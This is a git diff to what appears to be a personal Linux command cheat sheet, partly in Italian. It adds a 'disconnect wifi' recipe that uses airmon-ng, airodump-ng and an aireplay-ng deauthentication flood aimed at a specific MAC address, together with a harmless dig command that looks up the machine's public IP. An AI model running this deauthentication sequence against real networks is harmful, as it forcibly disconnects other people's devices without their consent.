@@ -217,3 +217,12 @@ current offset $$
 Le configurazioni di base di X server sono in /etc/X11/xinit/xserverrc
 (come arinterval e ardelay per la tastiera)
 
+disconnect wifi:
+	sudo airmon-ng start wlp4s0
+	sudo airodump-ng wlp4s0mon
+	sudo aireplay-ng  -0 99999 -c B0:4E:26:5E:BD:8A -a B0:4E:26:5E:BD:8A wlp4s0mon 
+	sudo airodump-ng -c 13 --bssid B0:4E:26:5E:BD:8A wlp4s0mon
+	sudo airmon-ng stop wlp4s0mon
+
+what is my ip
+	dig +short @resolver1.opendns.com myip.opendns.com
